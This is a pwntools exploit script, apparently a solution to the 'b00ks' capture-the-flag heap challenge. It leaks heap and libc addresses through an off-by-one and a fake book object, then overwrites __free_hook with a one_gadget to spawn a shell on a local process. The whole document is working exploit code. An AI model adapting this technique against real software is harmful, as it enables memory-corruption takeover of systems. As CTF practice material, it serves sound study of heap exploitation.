from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./b00ks"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)
context.arch = "amd64"
p.sendlineafter("Enter author name: ","a"*31+"t")

def create_book(size,book_name,description_size,book_description):
    p.sendlineafter("> ","1")
    p.sendlineafter("Enter book name size: ",str(size))
    p.sendlineafter("Enter book name (Max 32 chars): ",str(book_name))
    p.sendlineafter("Enter book description size: ",str(description_size))
    p.sendlineafter("Enter book description: ",str(book_description))

def print_book():
    p.sendlineafter("> ","4")

def edit_book(idx,description):
    p.sendlineafter("> ","3")
    p.sendlineafter("Enter the book id you want to edit: ",str(idx))
    p.sendlineafter("Enter new book description: ",str(description))

def changename(name):
    p.sendlineafter("> ","5")
    p.sendlineafter("Enter author name: ",str(name))

def printbook(id):
    p.readuntil("> ")
    p.sendline("4")
    p.readuntil(": ")
    for i in range(id):
        book_id = int(p.readline()[:-1])
        p.readuntil(": ")
        book_name = p.readline()[:-1]
        p.readuntil(": ")
        book_des = p.readline()[:-1]
        p.readuntil(": ")
        book_author = p.readline()[:-1]
    return book_id, book_name, book_des, book_author

def deletebook(book_id):
    p.readuntil("> ")
    p.sendline("2")
    p.readuntil(": ")
    p.sendline(str(book_id))

# leak book1 addr
create_book(140,"aaaa",140,"aaab")
create_book(0x21000, "cccc", 0x21000,"dddd") # mmap ,so only "cccc" and "dddd" on the heap
book_id_1, book_name, book_des, book_author = printbook(1)
book1_addr = u64(book_author[32:32+6].ljust(8,'\0'))
log.success("book1_addr is "+hex(book1_addr))

# fake object
payload = "A"*0x40 + p64(0x1) + p64(book1_addr + 0x38) * 2 + p64(0xffff) #fake obj
edit_book(1,payload)
changename("a"*32)
# leak libc base
book_id_1, book_name, book_des, book_author = printbook(1)
call_back = u64(book_name.ljust(8,"\0"))
offset = 0x5ac010
libc_base = call_back - offset
log.success("libc_base is ->" + hex(libc_base))

# get shell
free_hook = libc_base + libc.sym["__free_hook"]
log.success("__free_hook is ->" + hex(free_hook))
# one_offset = 0x45226
one_offset = 0x4527a
# one_offset = 0xf0364
# one_offset = 0xf1207
one_gadget = libc_base + one_offset
log.success("one_gadget is ->" + hex(one_gadget))
gdb.attach(p)
edit_book(1, p64(free_hook) * 2)
edit_book(2, p64(one_gadget))
deletebook(2)

# gdb.attach(p)
p.interactive()
